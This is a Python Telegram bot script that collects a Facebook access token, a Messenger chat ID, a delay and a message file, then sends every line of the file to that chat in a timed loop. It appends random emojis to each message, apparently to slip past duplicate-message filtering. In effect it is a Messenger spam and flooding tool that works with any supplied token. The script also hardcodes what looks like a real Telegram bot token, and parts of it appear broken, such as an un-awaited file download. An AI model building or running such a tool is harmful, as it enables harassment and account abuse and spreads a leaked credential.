import requests
import random
import logging
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# Telegram Bot Token (Replace with your bot token)
TELEGRAM_BOT_TOKEN = "7629260838:AAE7CiSi3caTmuwHvxlxsMpNW7dCnUnCOJo"

# Logging setup
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Conversation states
TOKEN, CHAT_ID, DELAY, MESSAGE_FILE = range(4)

# Random emoji generator
def random_emoji():
    emojis = ["😀", "😎", "🔥", "💯", "🚀", "✨", "🎉"]
    return random.choice(emojis)

# Function to send messages to Facebook Messenger
async def send_facebook_message(access_token, chat_id, message):
    url = f"https://graph.facebook.com/v15.0/t_{chat_id}/"
    payload = {"access_token": access_token, "message": message + " " + random_emoji()}
    response = requests.post(url, json=payload)

    if response.ok:
        logging.info(f"✅ Message sent: {message}")
        return True
    else:
        logging.error(f"❌ Failed to send message: {response.text}")
        return False

# Start command - Hamesha naya token mangega
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()  # Purana data delete kar diya, taake hamesha naya token mange
    await update.message.reply_text("🤖 Welcome! Please enter your **Facebook Access Token**:")
    return TOKEN

# Get Facebook Token from user
async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["token"] = update.message.text.strip()
    await update.message.reply_text("✅ Token saved! Now enter the **Facebook Chat ID**:")
    return CHAT_ID

# Get chat ID from user
async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["chat_id"] = update.message.text.strip()
    await update.message.reply_text("✅ Chat ID saved! Now enter the **delay in seconds**:")
    return DELAY

# Get delay time from user
async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["delay"] = int(update.message.text.strip())
        await update.message.reply_text("✅ Delay saved! Now send me the **message file** (txt format) to proceed.")
        return MESSAGE_FILE
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please enter a valid number for delay.")
        return DELAY

# Get message file
async def get_message_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    if file:
        file_path = await file.get_file()
        file_path.download("messages.txt")
        await update.message.reply_text("✅ Message file received! Type /send to start sending messages.")
        return ConversationHandler.END
    else:
        await update.message.reply_text("❌ Please send a valid message file.")
        return MESSAGE_FILE

# Send messages
async def send_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = context.user_data.get("token")
    chat_id = context.user_data.get("chat_id")
    delay = context.user_data.get("delay")

    if not token or not chat_id or not delay:
        await update.message.reply_text("❌ Error: Missing token, chat ID, or delay. Start again with /start.")
        return

    try:
        with open("messages.txt", "r") as f:
            messages = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        await update.message.reply_text("❌ Message file not found!")
        return

    for message in messages:
        success = await send_facebook_message(token, chat_id, message)
        if not success:
            await update.message.reply_text(f"❌ Failed to send message using the provided token.")
        await asyncio.sleep(delay)

    await update.message.reply_text("✅ All messages sent successfully!")

# Stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🛑 Stopping the bot...")
    return ConversationHandler.END  # End the conversation

# Telegram bot setup
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token)],
            CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chat_id)],
            DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
            MESSAGE_FILE: [MessageHandler(filters.Document.ALL, get_message_file)],
        },
        fallbacks=[CommandHandler("stop", stop)]
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("send", send_message))

    app.run_polling()

if __name__ == "__main__":
    main()
